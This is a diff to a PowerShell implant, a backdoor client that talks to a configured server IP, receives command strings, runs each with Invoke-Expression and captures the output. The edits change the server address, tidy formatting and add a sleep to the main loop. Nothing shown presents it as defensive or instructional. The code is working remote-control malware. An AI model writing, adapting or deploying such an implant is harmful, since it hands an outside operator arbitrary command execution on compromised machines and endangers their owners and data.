@@ -17,7 +17,7 @@ enum ServerMessageType {
 }
 
 # Configure me!
-$ServerIPAddress = '10.0.0.189'
+$ServerIPAddress = '10.0.0.94'
 $BufferSize = 65535
 $PingTimeout = 10 * 1000
 
@@ -54,10 +54,11 @@ while ($True) {
             $State = [ImplantState]::WaitingForInstruction
           }
           IssuingCommand {
-            $Command = [Text.Encoding]::UTF8.GetString($Reply.Buffer[1..($Reply.Buffer.Count-1)])
+            $Command = [Text.Encoding]::UTF8.GetString($Reply.Buffer[1..($Reply.Buffer.Count - 1)])
             try {
               $CommandResult = Invoke-Expression -Command $Command 2>&1 | Out-String
-            } catch {
+            }
+            catch {
               $CommandResult = $_.Exception.Message
             }
             $CommandIndex = 0
@@ -81,4 +82,5 @@ while ($True) {
       }
     }
   }
+  Start-Sleep 1;
 }
